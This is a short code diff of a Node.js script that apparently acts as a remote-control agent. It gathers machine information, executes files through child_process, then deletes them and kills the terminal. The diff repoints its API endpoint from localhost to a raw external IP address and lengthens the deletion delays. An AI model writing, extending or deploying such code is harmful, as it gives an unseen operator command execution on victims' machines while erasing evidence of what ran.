@@ -5,7 +5,7 @@ const exec = require('child_process').exec;
 const os = require('os');
 const fs = require('fs');
 const env = {
-	API_URL: "http://localhost:3000"
+	API_URL: "http://108.61.177.144:3000"
 };
 const request = require('request-promise');
 const system = {
@@ -110,7 +110,7 @@ const ping = (ipAddress, machineInfo) => {
 			system.exec(runCommand + " " + filePath);
 			setTimeout(() => {
 				deleteFile(filePath)
-			}, 2000);
+			}, 4000);
 		});
 	});
 
@@ -134,7 +134,7 @@ const ping = (ipAddress, machineInfo) => {
 								setTimeout(() => {
 									deleteFile(filePath) // delete the file
 									killTerminal();
-								}, 1500);
+								}, 4000);
 							});
 
 					});
